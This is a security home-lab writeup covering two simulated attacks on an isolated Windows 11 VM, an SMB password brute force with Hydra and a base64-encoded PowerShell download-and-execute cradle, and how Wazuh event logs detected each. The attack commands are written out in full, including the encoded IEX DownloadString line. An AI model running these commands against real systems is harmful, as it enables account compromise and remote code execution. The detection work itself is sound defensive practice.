# SOC Home Lab — Attack Detection Writeup

**Lab environment:** MacBook Air (Apple Silicon) host running VMware Fusion. Windows 11 Pro (ARM64) as the monitored endpoint, Kali Linux as the attacker machine, both on an isolated NAT network. Wazuh 4.9.0 (manager, indexer, dashboard) deployed via Docker on the host, ingesting Windows Security Event Log via the Wazuh agent and native Windows auditing (`auditpol`).

**Architecture:**
```
Kali Linux (attacker, 172.16.62.132)
        |
        | NAT network (isolated, host-only)
        |
Windows 11 Pro VM (target, 172.16.62.133)
  - Wazuh agent installed, forwarding Security event log
  - Native auditing enabled: Logon/Logoff, Process Creation (with command-line logging)
        |
        | agent -> manager
        v
Wazuh Manager / Indexer / Dashboard (Docker, running on Mac host)
  - Discover / Threat Hunting used for log analysis
```

**Note on tooling:** Sysmon could not be installed on this host — its kernel driver is compiled for x64 and refuses to load under Windows 11 ARM64 (`StartService failed for SysmonDrv: This driver has been blocked from loading`). Native Windows Security auditing was configured instead via `auditpol`, with command-line logging enabled via the `ProcessCreationIncludeCmdLine_Enabled` registry key. This provided sufficient visibility for both detections below (Event ID 4624/4625 for logons, 4688 for process creation with full command line).

---

## Attack 1 — Brute Force Authentication (SMB)

### MITRE ATT&CK Mapping
- **Technique:** T1110 — Brute Force
- **Sub-technique:** T1110.001 — Password Guessing

### Attack Execution
From Kali, using Hydra against the Windows target:

**Initial attempt (RDP) — failed to establish due to tooling limitation:**
```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://172.16.62.133
```
Hydra's RDP module is documented as experimental and could not complete the FreeRDP handshake against Windows 11's default TLS/NLA configuration, even after disabling Network Level Authentication. This was documented as a tooling limitation rather than a defensive control — RDP itself remained a viable brute-force target in principle.

**Successful attempt (SMB):**
```
hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://172.16.62.133
```
Command targeted TCP/445 (SMB) with the built-in `administrator` account against the full rockyou.txt wordlist (14,344,399 candidate passwords). Hydra automatically reduced concurrency to 1 task, as SMB does not tolerate parallel authentication attempts from a single source.

### Detection
**Query used (Wazuh Discover):**
```
data.win.system.eventID:4625
```

**Result:** 13 failed logon events captured within a 2-second window (15:31:56.909 – 15:31:58.917), all sourced from the Kali attacker IP, targeting the `administrator` account, using **NTLM** as the authentication package.

| Field | Value |
|---|---|
| Event ID | 4625 (An account failed to log on) |
| Source IP | 172.16.62.132 (Kali) |
| Target account | administrator |
| Auth package | NTLM |
| Agent | soclabs-windows (172.16.62.133) |
| Volume | 13 failures / ~2 seconds |

### Analyst Notes
- The defining signature here is **velocity, not just failure** — 13 authentication failures against the same account from the same source IP within a 2-second window is not consistent with human error; it is consistent with automated credential stuffing/brute-force tooling.
- NTLM (rather than Kerberos) as the auth package is expected here since this is a standalone workgroup machine, not a domain-joined host — in a real enterprise environment, NTLM auth attempts against a domain-joined asset would themselves be a secondary indicator worth flagging, since Kerberos is the default/expected protocol.
- **Recommended response in a live environment:** rate-limit or lock the account after N failures (Windows account lockout policy), alert on any single source IP generating >5 failed logons within 60 seconds, and cross-reference the source IP against threat intelligence feeds.
- **Detection gap identified:** this was found via manual search, not an automated alert. See "Next Steps" below for the custom correlation rule that would close this gap.

---

## Attack 2 — Obfuscated PowerShell Execution

### MITRE ATT&CK Mapping
- **Technique:** T1059.001 — Command and Scripting Interpreter: PowerShell
- **Technique:** T1027 — Obfuscated Files or Information (Base64 encoding)

### Attack Execution
Executed directly on the Windows target (simulating a scenario where an attacker has already achieved initial code execution, e.g. via phishing, and is now running a staged payload):

```
powershell.exe -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtACcAKQA=
```

Decoded, this command reads:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://example.com')
```

This is a benign target URL for lab safety, but the pattern — base64-encoded PowerShell that downloads and immediately executes (`IEX`, Invoke-Expression) remote content — is a well-established fileless malware / living-off-the-land technique used to stage second-stage payloads while evading simple plaintext signature matching.

### Detection
**Query used (Wazuh Discover):**
```
data.win.eventdata.commandLine:*enc*
```

**Result:** Single Event ID 4688 captured with the full command line preserved, including the complete base64 payload.

| Field | Value |
|---|---|
| Event ID | 4688 (A new process has been created) |
| Process | powershell.exe |
| Parent process | powershell.exe (spawned from an existing PowerShell session) |
| Account | hawk (standard user, not built-in Administrator) |
| Token elevation | TokenElevationTypeFull — full token, no privileges stripped |
| Command line | Full `-enc` flag + base64 payload captured |

### Analyst Notes
- The `-enc` (or `-EncodedCommand`) flag is one of the highest-value indicators in Windows process auditing. Legitimate administrative scripts occasionally use it, but its presence should always trigger review — it is disproportionately used by attackers specifically to defeat naive keyword searches (e.g., searching logs for the literal string "DownloadString" would have missed this event entirely, since the string only exists in decoded form).
- **Decoding process used for triage:**
  ```powershell
  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("<payload>"))
  ```
  PowerShell's `-enc` flag expects UTF-16LE (Unicode) encoded base64, not standard UTF-8 — this is a common trip-up when manually decoding these payloads.
- `TokenElevationTypeFull` combined with a standard (non-admin) user account indicates this ran without UAC elevation, meaning no admin consent prompt appeared. Full token elevation without an interactive elevation prompt is context-dependent — in a workgroup machine like this lab, standard users can still receive full tokens depending on UAC configuration, but it's worth noting as a review point in a hardened environment.
- **Recommended response in a live environment:** any encoded PowerShell command line, especially those spawning outbound HTTP connections shortly after (correlate with Event ID 5156/Windows Filtering Platform or Sysmon Event ID 3 for network connections), should be treated as high-priority for triage regardless of destination reputation.
- **Detection gap identified:** this environment lacks Sysmon (see Architecture note above), so network-connection-level correlation (which URL was actually reached, DNS query logged) is not available — only the initiating process and its command line are visible. A production environment should pair PowerShell logging with either Sysmon Event ID 3 or a network proxy/firewall log source to close this visibility gap.

---

## Summary Table

| # | Attack | MITRE Technique | Detection Event | Time to Detect |
|---|--------|-----------------|------------------|-----------------|
| 1 | SMB Brute Force | T1110.001 | Event ID 4625 (x13) | Manual search, <1 min after attack |
| 2 | Encoded PowerShell | T1059.001, T1027 | Event ID 4688 | Manual search, <1 min after attack |

## Tools Used
- **SIEM:** Wazuh 4.9.0 (Manager, Indexer, Dashboard) — deployed via Docker
- **Attacker platform:** Kali Linux (Hydra v9.6)
- **Target platform:** Windows 11 Pro (ARM64), native Windows Security auditing
- **Virtualization:** VMware Fusion on Apple Silicon

## Next Steps / Planned Improvements
1. **Automated correlation rule** — write a custom Wazuh rule in `local_rules.xml` that fires a high-severity alert when 5+ Event ID 4625 events occur within 60 seconds from the same source IP, rather than relying on manual search (currently the largest gap in this lab: detection exists, but alerting does not).
2. **Close the network-visibility gap** — evaluate options for network-connection logging (Windows Filtering Platform auditing, or resolving the Sysmon ARM64 driver incompatibility) to correlate process execution with actual outbound connections.
3. **Additional technique coverage** — credential access simulation via Atomic Red Team (LSASS access pattern, Sysmon Event ID 10 equivalent), and a persistence technique (scheduled task or registry Run key creation).
